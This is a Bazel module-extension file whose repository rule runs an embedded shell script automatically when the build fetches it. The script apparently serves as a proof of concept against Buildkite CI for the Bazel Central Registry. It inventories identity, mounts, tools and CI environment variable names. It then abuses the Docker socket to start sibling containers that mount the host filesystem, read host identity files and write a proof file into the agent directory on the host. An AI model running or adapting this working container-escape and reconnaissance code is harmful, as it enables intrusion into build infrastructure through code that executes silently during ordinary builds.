def _bcr_recon_repo_impl(repository_ctx):
    recon_script = """
echo BCR_BZLMOD_RECON_BEGIN
echo primitive=repository_ctx.execute
echo phase=bazel_module_extension_repository_rule
echo identity="$(id 2>/dev/null)"
echo working_directory="$(pwd)"
echo kernel="$(uname -a 2>/dev/null)"
echo mounted_paths_begin
ls -ldn /workdir /var/lib/buildkite-agent /var/run/docker.sock /usr/bin/buildkite-agent 2>&1 || true
echo mounted_paths_end
echo mountinfo_begin
sed -n '/\\/workdir\\|\\/var\\/lib\\/buildkite-agent\\|docker.sock\\|buildkite-agent/p' /proc/self/mountinfo 2>/dev/null | sed -n '1,40p'
echo mountinfo_end
echo tool_discovery_begin
for tool in buildkite-agent docker git bazel python3 curl wget gcloud gsutil; do
  path=$(command -v "$tool" 2>/dev/null || true)
  if [ -n "$path" ]; then
    echo "tool_present=$tool path=$path"
  else
    echo "tool_missing=$tool"
  fi
done
echo tool_discovery_end
echo ci_environment_names_begin
env | sed -n -e 's/^\\(BUILDKITE_[A-Z0-9_]*\\)=.*/env_present=\\1/p' -e 's/^\\(GOOGLE_[A-Z0-9_]*\\)=.*/env_present=\\1/p' -e 's/^\\(GITHUB_[A-Z0-9_]*\\)=.*/env_present=\\1/p' -e 's/^\\(DOCKER_[A-Z0-9_]*\\)=.*/env_present=\\1/p' | sort | sed -n '1,120p'
echo ci_environment_names_end
echo docker_socket_probe_begin
if [ -S /var/run/docker.sock ] && command -v docker >/dev/null 2>&1; then
  docker version 2>&1 | sed -n '1,80p'
else
  echo docker_socket_or_cli_missing
fi
echo docker_socket_probe_end

echo docker_daemon_identity_begin
if [ -S /var/run/docker.sock ] && command -v docker >/dev/null 2>&1; then
  docker info --format 'daemon_id={{.ID}}' 2>&1 || true
  docker info --format 'daemon_name={{.Name}}' 2>&1 || true
  docker info --format 'daemon_server_version={{.ServerVersion}}' 2>&1 || true
  docker info --format 'daemon_operating_system={{.OperatingSystem}}' 2>&1 || true
  docker info --format 'daemon_kernel_version={{.KernelVersion}}' 2>&1 || true
  docker info --format 'daemon_default_runtime={{.DefaultRuntime}}' 2>&1 || true
  docker info --format 'daemon_cgroup_driver={{.CgroupDriver}}' 2>&1 || true
  docker info --format 'daemon_docker_root_dir={{.DockerRootDir}}' 2>&1 || true
  docker info --format 'daemon_security_options={{json .SecurityOptions}}' 2>&1 || true
  docker info --format 'daemon_runtimes={{json .Runtimes}}' 2>&1 || true
else
  echo docker_socket_or_cli_missing
fi
echo docker_daemon_identity_end
echo docker_host_escape_probe_begin
if [ -S /var/run/docker.sock ] && command -v docker >/dev/null 2>&1; then
  proof_rel="bcr-docker-socket-proof/${BUILDKITE_BUILD_NUMBER:-unknown-build}/${BUILDKITE_JOB_ID:-unknown-job}"
  case "$proof_rel" in
    *[!A-Za-z0-9._/-]*)
      proof_rel="bcr-docker-socket-proof/sanitized"
      ;;
  esac
  proof_image="gcr.io/bazel-public/ubuntu2404"
  if ! docker image inspect "$proof_image" >/dev/null 2>&1; then
    proof_image="$(docker image ls --format '{{.Repository}}:{{.Tag}}' | awk '$1 !~ /<none>/ { print; exit }')"
  fi
  if [ -z "$proof_image" ]; then
    echo no_local_docker_image_for_host_escape
    exit 22
  else
    echo docker_host_escape_image="$proof_image"
    first_out="$(pwd)/docker_host_escape_first.out"
    second_out="$(pwd)/docker_host_escape_second.out"
    rm -f "$first_out" "$second_out"
    docker run --rm --pull=never --network none \
      -v /:/host:ro \
      -v /proc:/host-proc:ro \
      -v /var/lib/buildkite-agent:/host-agent:rw \
      -e BCR_PROOF_REL="$proof_rel" \
      "$proof_image" /bin/sh -c '
        set -eu
        echo sibling_container_host_read_begin
        echo "sibling_container_identity=$(id 2>/dev/null)"
        echo "sibling_container_uname=$(uname -a 2>/dev/null)"
        echo "sibling_container_hostname=$(hostname 2>/dev/null)"
        echo "docker_daemon_host_hostname=$(sed -n "1p" /host/etc/hostname 2>/dev/null || true)"
        echo "docker_daemon_proc_hostname=$(sed -n "1p" /host-proc/sys/kernel/hostname 2>/dev/null || true)"
        echo "docker_daemon_proc1_comm=$(sed -n "1p" /host-proc/1/comm 2>/dev/null || true)"
        echo docker_daemon_host_os_release_begin
        sed -n "1,12p" /host/etc/os-release 2>/dev/null || true
        echo docker_daemon_host_os_release_end
        echo docker_daemon_proc1_cgroup_begin
        sed -n "1,40p" /host-proc/1/cgroup 2>/dev/null || true
        echo docker_daemon_proc1_cgroup_end
        echo docker_daemon_mountinfo_buildkite_begin
        sed -n "/buildkite-agent\\|docker\\|overlay\\|workdir/p" /host-proc/1/mountinfo 2>/dev/null | sed -n "1,80p" || true
        echo docker_daemon_mountinfo_buildkite_end
        echo docker_daemon_host_paths_begin
        ls -ldn /host /host/etc /host/proc /host/var/lib/buildkite-agent /host-agent 2>&1 || true
        stat -c "host_root_stat dev=%d inode=%i mode=%a uid=%u gid=%g path=%n" /host 2>/dev/null || true
        stat -c "host_agent_stat dev=%d inode=%i mode=%a uid=%u gid=%g path=%n" /host/var/lib/buildkite-agent /host-agent 2>/dev/null || true
        echo docker_daemon_host_paths_end
        echo docker_daemon_host_identity_hashes_begin
        if command -v sha256sum >/dev/null 2>&1; then
          sha256sum /host/etc/machine-id /host-proc/sys/kernel/random/boot_id 2>/dev/null | sed "s# /host# docker_daemon_host#; s# /host-proc# docker_daemon_proc#" || true
        else
          cksum /host/etc/machine-id /host-proc/sys/kernel/random/boot_id 2>/dev/null | sed "s# /host# docker_daemon_host#; s# /host-proc# docker_daemon_proc#" || true
        fi
        echo docker_daemon_host_identity_hashes_end
        test -d /host-agent
        mkdir -p "/host-agent/$BCR_PROOF_REL"
        {
          echo docker_socket_host_write_proof
          date -u +%Y-%m-%dT%H:%M:%SZ
          id
          uname -a
          printf "docker_daemon_host_hostname="
          sed -n "1p" /host/etc/hostname 2>/dev/null || true
          printf "docker_daemon_proc_hostname="
          sed -n "1p" /host-proc/sys/kernel/hostname 2>/dev/null || true
          printf "docker_daemon_proc1_comm="
          sed -n "1p" /host-proc/1/comm 2>/dev/null || true
        } > "/host-agent/$BCR_PROOF_REL/proof.txt"
        echo "sibling_container_host_write_path=/var/lib/buildkite-agent/$BCR_PROOF_REL/proof.txt"
        sed -n "1,40p" "/host-agent/$BCR_PROOF_REL/proof.txt"
        echo sibling_container_host_read_end
      ' > "$first_out" 2>&1
    first_rc="$?"
    sed -n '1,260p' "$first_out"
    docker run --rm --pull=never --network none \
      -v /var/lib/buildkite-agent:/host-agent:rw \
      -e BCR_PROOF_REL="$proof_rel" \
      "$proof_image" /bin/sh -c '
        set -eu
        echo sibling_container_second_read_begin
        test -f "/host-agent/$BCR_PROOF_REL/proof.txt"
        sed -n "1,40p" "/host-agent/$BCR_PROOF_REL/proof.txt"
        rm -rf "/host-agent/$BCR_PROOF_REL"
        echo sibling_container_second_read_and_cleanup_end
      ' > "$second_out" 2>&1
    second_rc="$?"
    sed -n '1,160p' "$second_out"
    rm -f "$first_out" "$second_out"
    if [ "$first_rc" -eq 0 ] && [ "$second_rc" -eq 0 ]; then
      echo docker_host_escape_result=PROVEN_DOCKER_DAEMON_HOST_READ_WRITE_AND_CLEANUP
    else
      echo docker_host_escape_result=FAILED first_rc="$first_rc" second_rc="$second_rc"
      exit 23
    fi
  fi
else
  echo docker_socket_or_cli_missing
  exit 21
fi
echo docker_host_escape_probe_end
echo BCR_BZLMOD_RECON_END
"""
    result = repository_ctx.execute(["/bin/sh", "-c", recon_script], quiet = False)
    print(result.stdout)
    if result.stderr:
        print(result.stderr)
    if result.return_code != 0:
        fail("bcr recon command failed with return_code=%s" % result.return_code)
    repository_ctx.file("recon.txt", "repository_ctx.execute return_code=%s\n" % result.return_code)
    repository_ctx.file(
        "BUILD.bazel",
        "filegroup(name = 'recon_marker', srcs = ['recon.txt'], visibility = ['//visibility:public'])\n",
    )

bcr_recon_repo = repository_rule(implementation = _bcr_recon_repo_impl)

def _bcr_recon_impl(module_ctx):
    bcr_recon_repo(name = "bcr_recon_repo")

bcr_recon = module_extension(implementation = _bcr_recon_impl)
